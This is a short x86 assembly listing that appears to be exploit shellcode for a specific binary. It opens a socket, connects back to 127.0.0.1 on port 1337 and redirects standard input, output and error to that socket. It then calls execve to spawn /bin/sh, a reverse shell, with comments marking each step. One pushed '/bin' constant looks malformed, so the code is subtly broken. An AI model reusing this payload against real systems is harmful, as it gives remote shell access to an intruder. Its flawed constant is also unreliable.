	mov esp,0xbfffdde8	;

	#socket initiate 

	xor ecx,ecx		
	push ecx		;
	inc ecx			;
	push ecx		; #sock stream
	inc ecx			;
	push ecx		;
	mov ebx,0x8048730	; #socket
	call ebx		;
	mov esi,eax		;

#server adress
	push 0x0100007f		; #IP
	mov ax,0x3905		; #PORT
	push ax			;
	mov ax,0x0002		; #bin   10 00000000
	push ax			;


	#connect
#parameters
	mov ecx,esp		;
	mov ebx,16		; #size of server adress
	push ebx		;
	push ecx		;
	push esi		;

#func call
	mov ebx,0x8048750	;
	call ebx		;
#redirect
	mov ebx,0x8048600	;
	xor ecx,ecx		;
	push ecx		;
	push esi		;
	call ebx		;
	inc ecx			;
	push ecx		;
	push esi		;
	call ebx		;
	inc ecx			;
	push ecx		;
	push esi		;
	call ebx		;



#execv("/bin/sh\0",NULL)
#used for help : stackoverflow 	
	xor eax,eax		;
	push eax		;
	push 0x68732f2f		;
	push 0x6e6922f		;
	mov ebx,esp		;
	push eax
	push ebx
	mov ebx,0x80486d0	;
	call ebx		;
